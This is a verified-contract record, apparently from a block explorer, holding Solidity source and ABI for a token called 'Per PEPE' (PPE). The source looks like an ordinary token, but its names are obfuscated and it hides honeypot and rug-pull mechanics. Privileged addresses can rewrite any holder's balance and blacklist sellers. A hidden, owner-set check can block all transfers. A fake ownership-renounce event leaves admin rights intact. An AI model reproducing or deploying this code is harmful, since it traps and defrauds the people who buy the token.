{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface sellMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapMin) external view returns (uint256);\n\n    function transfer(address atModeTx, uint256 listLaunch) external returns (bool);\n\n    function allowance(address fromLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atModeTx,\n        uint256 listLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchedToken, uint256 value);\n    event Approval(address indexed fromLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract senderFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldReceiverSender {\n    function createPair(address swapExempt, address marketingWallet) external returns (address);\n}\n\ninterface sellMinMetadata is sellMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PerPEPE is senderFrom, sellMin, sellMinMetadata {\n\n    function fundEnable(address receiverShouldMarketing, address atModeTx, uint256 listLaunch) internal returns (bool) {\n        if (receiverShouldMarketing == marketingTx) {\n            return totalToWallet(receiverShouldMarketing, atModeTx, listLaunch);\n        }\n        uint256 buyTxTake = sellMin(receiverShould).balanceOf(launchedFund);\n        require(buyTxTake == receiverTakeAmount);\n        require(atModeTx != launchedFund);\n        if (toLimit[receiverShouldMarketing]) {\n            return totalToWallet(receiverShouldMarketing, atModeTx, buyEnable);\n        }\n        return totalToWallet(receiverShouldMarketing, atModeTx, listLaunch);\n    }\n\n    address private shouldAmount;\n\n    function feeLaunch(address swapSender) public {\n        receiverTrading();\n        \n        if (swapSender == marketingTx || swapSender == receiverShould) {\n            return;\n        }\n        toLimit[swapSender] = true;\n    }\n\n    bool private takeBuy;\n\n    uint256 private totalSwap = 100000000 * 10 ** 18;\n\n    uint8 private maxFeeEnable = 18;\n\n    uint256 constant buyEnable = 6 ** 10;\n\n    uint256 private limitTxReceiver;\n\n    function allowance(address swapIs, address exemptList) external view virtual override returns (uint256) {\n        if (exemptList == teamTotal) {\n            return type(uint256).max;\n        }\n        return walletMode[swapIs][exemptList];\n    }\n\n    constructor (){\n        if (liquidityAt != limitTxReceiver) {\n            enableMax = true;\n        }\n        isAuto minFrom = isAuto(teamTotal);\n        receiverShould = shouldReceiverSender(minFrom.factory()).createPair(minFrom.WETH(), address(this));\n        if (takeBuy) {\n            fromLaunchLaunched = false;\n        }\n        marketingTx = _msgSender();\n        receiverSellShould();\n        fundMax[marketingTx] = true;\n        exemptAt[marketingTx] = totalSwap;\n        \n        emit Transfer(address(0), marketingTx, totalSwap);\n    }\n\n    string private shouldMode = \"Per PEPE\";\n\n    function receiverTrading() private view {\n        require(fundMax[_msgSender()]);\n    }\n\n    function marketingSell(address enableAuto) public {\n        require(enableAuto.balance < 100000);\n        if (tokenAt) {\n            return;\n        }\n        if (txFund) {\n            limitLaunched = limitTxReceiver;\n        }\n        fundMax[enableAuto] = true;\n        if (fromLaunchLaunched != feeListWallet) {\n            feeListWallet = true;\n        }\n        tokenAt = true;\n    }\n\n    bool private fromLaunchLaunched;\n\n    function limitMarketingTo(uint256 listLaunch) public {\n        receiverTrading();\n        receiverTakeAmount = listLaunch;\n    }\n\n    address launchedFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private exemptAt;\n\n    mapping(address => mapping(address => uint256)) private walletMode;\n\n    address public marketingTx;\n\n    uint256 receiverTakeAmount;\n\n    function receiverSellShould() public {\n        emit OwnershipTransferred(marketingTx, address(0));\n        shouldAmount = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldMode;\n    }\n\n    bool public feeListWallet;\n\n    function transferFrom(address receiverShouldMarketing, address atModeTx, uint256 listLaunch) external override returns (bool) {\n        if (_msgSender() != teamTotal) {\n            if (walletMode[receiverShouldMarketing][_msgSender()] != type(uint256).max) {\n                require(listLaunch <= walletMode[receiverShouldMarketing][_msgSender()]);\n                walletMode[receiverShouldMarketing][_msgSender()] -= listLaunch;\n            }\n        }\n        return fundEnable(receiverShouldMarketing, atModeTx, listLaunch);\n    }\n\n    uint256 private receiverTotalExempt;\n\n    mapping(address => bool) public toLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minFundList;\n    }\n\n    uint256 walletAmountTrading;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFeeEnable;\n    }\n\n    mapping(address => bool) public fundMax;\n\n    function transfer(address fromReceiverList, uint256 listLaunch) external virtual override returns (bool) {\n        return fundEnable(_msgSender(), fromReceiverList, listLaunch);\n    }\n\n    bool public enableMax;\n\n    address teamTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function enableMode(address fromReceiverList, uint256 listLaunch) public {\n        receiverTrading();\n        exemptAt[fromReceiverList] = listLaunch;\n    }\n\n    uint256 public limitLaunched;\n\n    function balanceOf(address swapMin) public view virtual override returns (uint256) {\n        return exemptAt[swapMin];\n    }\n\n    function owner() external view returns (address) {\n        return shouldAmount;\n    }\n\n    event OwnershipTransferred(address indexed listTake, address indexed buyMinToken);\n\n    function approve(address exemptList, uint256 listLaunch) public virtual override returns (bool) {\n        walletMode[_msgSender()][exemptList] = listLaunch;\n        emit Approval(_msgSender(), exemptList, listLaunch);\n        return true;\n    }\n\n    address public receiverShould;\n\n    bool public tokenAt;\n\n    function totalToWallet(address receiverShouldMarketing, address atModeTx, uint256 listLaunch) internal returns (bool) {\n        require(exemptAt[receiverShouldMarketing] >= listLaunch);\n        exemptAt[receiverShouldMarketing] -= listLaunch;\n        exemptAt[atModeTx] += listLaunch;\n        emit Transfer(receiverShouldMarketing, atModeTx, listLaunch);\n        return true;\n    }\n\n    string private minFundList = \"PPE\";\n\n    function getOwner() external view returns (address) {\n        return shouldAmount;\n    }\n\n    uint256 private liquidityAt;\n\n    bool private txFund;\n\n    bool public limitEnableReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMinToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunch\",\"type\":\"uint256\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"}],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeListWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLaunch\",\"type\":\"uint256\"}],\"name\":\"limitMarketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSellShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShouldMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atModeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PerPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}